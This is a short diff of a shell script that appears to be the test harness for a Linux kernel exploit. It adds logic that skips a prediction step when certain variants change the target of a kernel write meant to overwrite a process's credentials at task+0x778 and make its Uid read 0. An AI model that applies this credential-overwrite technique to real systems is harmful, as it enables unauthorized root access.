@@ -265,7 +265,14 @@ shot() {
     SHOT_STATUS=$(uid_line "$CPID")
     SHOT_WT=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
     say "  [$tag] victim readback NOW: [$SHOT_STATUS]"
-    if [ -n "$SHOT_WT" ] && [ "${off}" = "0x778" ]; then
+    # Only meaningful when the target really is task+0x778; with MIMIC_W1 (or any
+    # EXTRA that swaps the target) the prediction would be about a cred nothing
+    # wrote to.
+    case "$EXTRA$extra" in
+      *MIMIC*|*V12_W7_VALUE*) SKIP_PRED=1;;
+      *) SKIP_PRED=0;;
+    esac
+    if [ -n "$SHOT_WT" ] && [ "${off}" = "0x778" ] && [ "$SKIP_PRED" = 0 ]; then
         hi=$(( SHOT_WT >> 32 & 0xffffffff )); lo=$(( SHOT_WT & 0xffffffff ))
         say "  [$tag] if 0x778 LANDED the side effect puts write_target at cred+8, so"
         say "  [$tag] /proc/status must read:  Uid: 0 0 $hi 0   and   Gid first field = $lo"
